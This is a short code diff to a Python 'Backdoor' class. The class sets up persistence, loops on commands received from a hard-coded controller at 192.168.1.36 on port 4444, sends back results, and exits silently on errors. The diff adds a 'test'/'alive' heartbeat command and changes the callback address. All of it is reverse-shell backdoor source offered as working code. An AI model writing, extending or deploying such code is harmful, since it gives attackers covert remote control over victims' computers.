@@ -104,6 +104,8 @@ class Backdoor:
         self.persistence()
         while True:
             recv_data = self.reliable_receive()
+            if recv_data[0] == "test":
+                self.reliable_send("alive")
             if recv_data[0] == "exit":
                 self.sock_obj.close()
                 sys.exit(0) 
@@ -119,7 +121,7 @@ class Backdoor:
             self.reliable_send(res)
 
 try:
-    backdoor = Backdoor("192.168.1.37",4444)
+    backdoor = Backdoor("192.168.1.36",4444)
     backdoor.run()
 except:
     sys.exit(0)
